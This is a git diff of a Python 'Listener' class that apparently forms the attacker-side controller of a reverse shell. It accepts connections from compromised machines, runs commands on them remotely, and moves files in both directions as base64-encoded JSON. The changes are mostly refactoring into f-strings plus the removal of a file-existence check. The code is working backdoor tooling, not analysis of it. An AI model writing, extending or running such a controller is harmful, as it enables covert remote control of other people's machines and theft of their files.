@@ -11,7 +11,7 @@ class Listener:
         self.listener.listen(1)
         print("[+] Waiting for incoming connections")
         self.connection, address = self.listener.accept()
-        print("[+] Got a connection from " + str(address))
+        print(f"[+] Got a connection from {str(address)}")
 
     def reliable_send(self, data):
         json_data = json.dumps(data)
@@ -31,13 +31,9 @@ class Listener:
         return self.reliable_receive()
 
     def write_file(self, path, content):    
-        if os.path.isfile(path):
-            with open(path, "wb") as file:
-                decoded_content = base64.b64decode(content)
-                file.write(decoded_content)
-            print("[+] Upload successful")
-        else:
-            print(f"[-] {path} does not exist")
+        with open(path, "wb") as file:
+            decoded_content = base64.b64decode(content)
+            file.write(decoded_content)
 
     def read_file(self, path):
         if os.path.isfile(path):
@@ -59,15 +55,15 @@ class Listener:
                     if "[-] Error" not in result:
                         filename = command.split()[1]
                         self.write_file(filename, result)
-                        print("[+] File Downloaded as " + filename)
-                        print("-> Content : " + result)
+                        print(f"[+] File Downloaded as {filename}")
+                        print(f"-> Content : {result}")
                     else:
                         print(result)
                 elif command.split()[0] == "upload":
                     file_path = command.split()[1]
                     file_content = self.read_file(file_path)
                     if file_content != None:
-                        result = self.execute_remotely(command + " " + file_content)
+                        result = self.execute_remotely(f"{command} {file_content}")
                         print(result)
                 else:
                     result = self.execute_remotely(command)
